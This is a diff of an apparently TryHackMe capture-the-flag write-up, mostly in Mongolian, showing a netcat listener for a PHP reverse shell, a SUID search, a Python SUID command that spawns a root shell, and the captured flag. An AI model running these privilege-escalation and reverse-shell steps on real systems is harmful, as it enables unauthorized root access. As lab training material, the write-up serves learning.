@@ -24,12 +24,21 @@ php reverse shell бэлэн source code татаж аван өөрийн tun0 �
 #### nc -lvnp 1234 --> netcat ашиглан user ээр нэвтэрч чадав
 
 
+![Screenshot (59)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/252a2042-254d-4f91-8609-5b00b9550754)
+
+![Screenshot (61)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/b119c093-07ba-463d-92f5-fc64fe9af849)
+$find / -user root -perm / 4000 командаар шалгатал root рүү permission denied зааж байсан тул 
 
 
+![Screenshot (63)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/d6e7df8f-fb87-45b5-88db-bcbb35c36b42)
+SUID privileges хийх арга олсон
 
-
-
-
-
-
-
+![Screenshot (65)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/d517dedf-b8cc-480a-8541-23f65a1f3434)
+##### /usr/bin/./python -c 'import os; os.execl("/bin/sh", "sh", "-p")
+```#whoami```
+root 
+cd /root
+ls
+root.txt
+cat root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
